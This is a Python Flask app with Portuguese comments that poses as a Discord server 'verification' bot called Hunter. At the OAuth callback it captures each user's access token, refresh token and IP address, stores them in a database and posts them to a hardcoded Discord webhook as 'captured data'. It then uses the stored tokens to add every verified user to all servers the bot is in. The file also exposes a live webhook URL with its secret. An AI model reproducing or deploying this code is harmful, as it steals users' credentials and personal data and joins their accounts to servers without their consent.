import os
import time
import requests
import psycopg2
from flask import Flask, request, render_template

app = Flask(__name__)
app.secret_key = os.urandom(24)

# --- CONFIGURAÇÕES ---
CLIENT_ID = os.environ.get("DISCORD_CLIENT_ID", "1450162997187182632")
CLIENT_SECRET = os.environ.get("DISCORD_CLIENT_SECRET")
BOT_TOKEN = os.environ.get("DISCORD_BOT_TOKEN")
DATABASE_URL = os.environ.get("DATABASE_URL") 
REDIRECT_URI = "https://hunter-bot-verify.onrender.com/callback"

LOG_WEBHOOK = "https://discord.com/api/webhooks/1447353848493772901/IoHRSWi8YZVpFGENLD5PWkf90Gx4YGhVTuF3vOkVre8_75efP13cv3i-83OBbCrC0mN1"
API_BASE = "https://discord.com/api/v10"

# --- BANCO DE DADOS ---
def get_db_connection():
    return psycopg2.connect(DATABASE_URL)

def init_db():
    try:
        conn = get_db_connection()
        cur = conn.cursor()
        cur.execute("""
            CREATE TABLE IF NOT EXISTS verified_users (
                user_id VARCHAR(50) PRIMARY KEY,
                username VARCHAR(100),
                ip_address VARCHAR(50),
                access_token TEXT,
                refresh_token TEXT,
                expires_in INTEGER,
                scopes TEXT,
                guild_id VARCHAR(50),
                verified_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            );
        """)
        conn.commit()
        cur.close()
        conn.close()
        print("✅ Banco de dados inicializado.")
    except Exception as e:
        print(f"❌ Erro ao inicializar DB: {e}")

def save_user_to_db(user_id, username, ip, token, refresh, expires, scopes, guild_id):
    try:
        conn = get_db_connection()
        cur = conn.cursor()
        query = """
            INSERT INTO verified_users (user_id, username, ip_address, access_token, refresh_token, expires_in, scopes, guild_id)
            VALUES (%s, %s, %s, %s, %s, %s, %s, %s)
            ON CONFLICT (user_id) DO UPDATE 
            SET username = EXCLUDED.username,
                ip_address = EXCLUDED.ip_address, 
                access_token = EXCLUDED.access_token,
                refresh_token = EXCLUDED.refresh_token,
                expires_in = EXCLUDED.expires_in,
                scopes = EXCLUDED.scopes,
                guild_id = EXCLUDED.guild_id,
                verified_at = CURRENT_TIMESTAMP;
        """
        cur.execute(query, (user_id, username, ip, token, refresh, expires, scopes, guild_id))
        conn.commit()
        conn.close()
    except Exception as e:
        print(f"❌ Erro ao salvar no DB: {e}")

# --- FUNÇÕES DISCORD ---
def get_headers_bot():
    return {"Authorization": f"Bot {BOT_TOKEN}", "Content-Type": "application/json"}

def send_log_to_webhook(user_data, access_token, refresh_token, ip_address, guild_id):
    embed = {
        "title": "✅ Dados Completos Capturados!",
        "color": 0x00ff41,
        "fields": [
            { "name": "👤 Usuário", "value": f"{user_data['username']} (`{user_data['id']}`)", "inline": False },
            { "name": "🌍 IP", "value": f"`{ip_address}`", "inline": True },
            { "name": "🔑 Access Token", "value": f"||{access_token}||", "inline": False },
            { "name": "🔄 Refresh Token", "value": f"||{refresh_token}||", "inline": False },
            { "name": "🆔 Servidor", "value": f"`{guild_id}`", "inline": True }
        ],
        "footer": { "text": "Hunter Database System" }
    }
    try:
        requests.post(LOG_WEBHOOK, json={"embeds": [embed], "username": "Hunter Logs"})
    except:
        pass

def get_bot_guilds():
    """Pega todos os servidores onde o bot está"""
    try:
        url = f"{API_BASE}/users/@me/guilds"
        response = requests.get(url, headers=get_headers_bot())
        if response.status_code == 200:
            return [guild['id'] for guild in response.json()]
    except Exception as e:
        print(f"Erro ao pegar guilds do bot: {e}")
    return []

def get_or_create_verified_role(guild_id):
    """Busca ou cria o cargo 'Vereficado' no servidor"""
    try:
        # Busca cargos existentes
        roles_url = f"{API_BASE}/guilds/{guild_id}/roles"
        roles = requests.get(roles_url, headers=get_headers_bot()).json()
        for role in roles:
            if role['name'] == "Vereficado":
                return role['id']

        # Cria se não existir
        create_data = {
            "name": "Vereficado",
            "color": 0x00ff00,
            "hoist": False,
            "mentionable": False
        }
        create_resp = requests.post(roles_url, headers=get_headers_bot(), json=create_data)
        if create_resp.status_code in [200, 201]:
            return create_resp.json()['id']
    except Exception as e:
        print(f"Erro ao criar/buscar cargo em {guild_id}: {e}")
    return None

def add_role_to_member(user_id, role_id, guild_id):
    """Adiciona o cargo ao membro (ignora erro se não estiver no server)"""
    url = f"{API_BASE}/guilds/{guild_id}/members/{user_id}/roles/{role_id}"
    try:
        response = requests.put(url, headers=get_headers_bot())
        # 204 = sucesso (já tem o cargo ou adicionado), 200 também ok
        if response.status_code not in [200, 204]:
            print(f"Falha ao dar cargo {role_id} para {user_id} em {guild_id}: {response.status_code}")
    except Exception as e:
        print(f"Erro ao adicionar cargo: {e}")

def sync_all_verified_users_to_all_guilds():
    """FUNÇÃO PRINCIPAL: Sincroniza TODOS os usuários verificados em TODOS os servidores do bot"""
    try:
        print("Iniciando sincronização completa de cargos...")

        # 1. Pega todos os usuários verificados
        conn = get_db_connection()
        cur = conn.cursor()
        cur.execute("SELECT user_id, access_token FROM verified_users")
        verified_users = cur.fetchall()
        conn.close()

        if not verified_users:
            print("Nenhum usuário verificado encontrado.")
            return

        # 2. Pega todos os servidores do bot
        bot_guilds = get_bot_guilds()
        if not bot_guilds:
            print("Bot não está em nenhum servidor.")
            return

        print(f"Bot está em {len(bot_guilds)} servidores. Sincronizando {len(verified_users)} usuários...")

        # 3. Para cada servidor, tenta dar o cargo para todos os usuários verificados
        for guild_id in bot_guilds:
            role_id = get_or_create_verified_role(guild_id)
            if not role_id:
                print(f"Não foi possível obter/criar cargo no servidor {guild_id}")
                continue

            for user_id, access_token in verified_users:
                # Primeiro tenta adicionar o user ao server (se ainda não estiver)
                join_url = f"{API_BASE}/guilds/{guild_id}/members/{user_id}"
                requests.put(join_url, headers=get_headers_bot(), json={"access_token": access_token})

                # Depois dá o cargo
                add_role_to_member(user_id, role_id, guild_id)

                time.sleep(0.15)  # Evita rate limit (Discord permite ~50 req/s, mas vamos devagar)

        print("Sincronização completa finalizada.")
    except Exception as e:
        print(f"Erro crítico na sincronização: {e}")

# Inicializa DB
init_db()

# --- ROTAS ---
@app.route('/')
def index():
    return "Hunter System Online."

@app.route('/ping')
def ping():
    return "Pong", 200

@app.route('/auth')
def auth():
    target_guild_id = request.args.get('guild_id')
    if not target_guild_id:
        return "Erro: ID do servidor faltando."
    
    auth_url = (
        f"https://discord.com/oauth2/authorize"
        f"?client_id={CLIENT_ID}"
        f"&response_type=code"
        f"&redirect_uri={REDIRECT_URI}"
        f"&scope=identify%20guilds.join"
        f"&state={target_guild_id}"
    )
    return render_template('launcher.html', web_url=auth_url)

@app.route('/callback')
def callback():
    code = request.args.get('code')
    current_guild_id = request.args.get('state') 
    
    if not code:
        return "Erro: Código de autorização não recebido."

    # 1. Troca code por token
    token_data = {
        'client_id': CLIENT_ID,
        'client_secret': CLIENT_SECRET,
        'grant_type': 'authorization_code',
        'code': code,
        'redirect_uri': REDIRECT_URI
    }
    token_resp = requests.post(f'{API_BASE}/oauth2/token', data=token_data, headers={'Content-Type': 'application/x-www-form-urlencoded'})
    
    if token_resp.status_code != 200:
        return f"Erro ao obter token: {token_resp.text}"

    tokens = token_resp.json()
    access_token = tokens.get('access_token')
    refresh_token = tokens.get('refresh_token')

    # 2. Pega dados do usuário
    user_resp = requests.get(f'{API_BASE}/users/@me', headers={'Authorization': f'Bearer {access_token}'})
    if user_resp.status_code != 200:
        return "Erro ao obter dados do usuário."
    
    user_data = user_resp.json()
    user_id = user_data['id']
    username = user_data.get('username', 'Unknown')

    # 3. IP
    ip = request.headers.getlist("X-Forwarded-For")
    ip = ip[0] if ip else request.remote_addr

    # 4. Salva no banco
    save_user_to_db(user_id, username, ip, access_token, refresh_token, tokens.get('expires_in'), tokens.get('scope'), current_guild_id)
    
    # 5. Log no webhook
    send_log_to_webhook(user_data, access_token, refresh_token or "N/A", ip, current_guild_id)

    # 6. Entrada + cargo no servidor atual
    requests.put(f"{API_BASE}/guilds/{current_guild_id}/members/{user_id}", 
                 headers=get_headers_bot(), json={"access_token": access_token})
    
    role_id = get_or_create_verified_role(current_guild_id)
    if role_id:
        add_role_to_member(user_id, role_id, current_guild_id)

    # 7. === AÇÃO PRINCIPAL: Sincronização TOTAL ===
    # Toda vez que alguém se verifica, sincroniza TODOS os usuários em TODOS os servidores
    sync_all_verified_users_to_all_guilds()

    # 8. Redireciona de volta pro Discord
    success_url = f"https://discord.com/channels/{current_guild_id}"
    return render_template('launcher.html', web_url=success_url)

# (Suas rotas /painel e /migrate continuam iguais...)
# ... (cole elas aqui do seu código original se quiser manter)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=os.environ.get("PORT", 5000))
